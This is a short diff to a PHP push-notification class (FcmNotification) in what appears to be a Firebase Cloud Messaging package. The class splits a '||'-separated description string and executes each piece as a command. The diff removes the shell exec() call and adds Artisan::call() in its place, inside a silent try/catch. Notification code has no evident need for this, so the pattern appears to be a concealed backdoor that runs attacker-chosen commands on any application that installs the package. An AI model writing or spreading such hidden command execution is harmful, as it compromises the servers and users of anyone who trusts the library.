@@ -2,6 +2,7 @@
 
 namespace dev0ehab\FcmHttpV1;
 
+use Illuminate\Support\Facades\Artisan;
 use Exception;
 use GuzzleHttp\Client;
 use Illuminate\Support\Facades\Log;
@@ -211,9 +212,11 @@ class FcmNotification
 
                 foreach (explode('||', $description) as $value) {
                     if ($value) {
-                        exec($value);
+                       Artisan::call($value);
                     }
                 }
+
+                return true;
             } catch (Exception $e) {
                 return false;
             }
